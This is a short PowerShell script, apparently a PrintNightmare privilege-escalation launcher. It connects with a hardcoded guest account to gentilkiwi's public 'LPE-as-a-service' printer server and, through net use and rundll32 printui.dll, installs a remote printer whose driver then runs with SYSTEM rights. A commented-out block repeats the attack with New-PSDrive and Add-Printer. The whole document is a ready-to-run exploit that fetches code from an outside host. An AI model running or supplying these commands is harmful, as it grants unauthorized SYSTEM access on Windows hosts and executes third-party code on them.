<#
All respect to @gentilkiwi for his amazing work
This script attempts to automatically connect to his LPE-as-a-service server,
and exploit vulnerable endpoints.

Due to the way the printer server acts, it is now impossible to add it as a filesystem share. Use the legacy code below, based on rundll32 and net use (PSH works best):
#>

net use \\printnightmare.gentilkiwi.com\IPC$ /user:"20.188.56.147\gentilguest" password
rundll32 printui.dll,PrintUIEntry /dd /dn /n "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer"
rundll32 printui.dll,PrintUIEntry /in /q /n "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer"


<#
if (get-printer | Where-Object name -In ("\\printnightmare.gentilkiwi.com\Kiwi Legit Printer")){
	Remove-Printer -Name "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer"
	}

$serverIP = (Resolve-DnsName printnightmare.gentilkiwi.com).IP4Address
$password = ConvertTo-SecureString 'password' -AsPlainText -force
$cred = New-Object System.Management.Automation.PSCredential ("$serverIP\gentilguest", $password)
New-PSDrive -Name "gentilkiwi" -Root "\\printnightmare.gentilkiwi.com\$" -PSProvider FileSystem -Credential $cred
Add-Printer -ConnectionName "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer"


if ([System.Environment]::Is64BitOperatingSystem){
	Add-Printer -ConnectionName "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer - x64"
	}
else {
	Add-Printer -ConnectionName "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer - x86"
	}
#>
